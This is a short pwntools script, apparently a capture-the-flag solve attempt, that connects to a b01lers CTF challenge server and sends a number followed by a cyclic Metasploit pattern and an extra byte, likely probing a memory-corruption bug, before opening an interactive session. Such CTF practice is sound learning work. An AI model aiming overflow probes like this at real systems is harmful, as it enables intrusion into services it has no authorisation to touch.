#!/usr/bin/env python3

from pwn import *

exe = ELF("./metacortex-72ec7dee20d0b191fe14dc2480bd3f43")

context.binary = exe


def conn():
        return process([exe.path])

def main():
    #    r = conn()
    r = remote("chal.ctf.b01lers.com", 1014)

    r.recvline()
    pause()
    r.sendline(bytes(str(0x0), 'utf-8') + cyclic_metasploit(0x67) + b"M")
    #r.sendline(str(0x55b6))
    r.interactive()

if __name__ == "__main__":
        main()

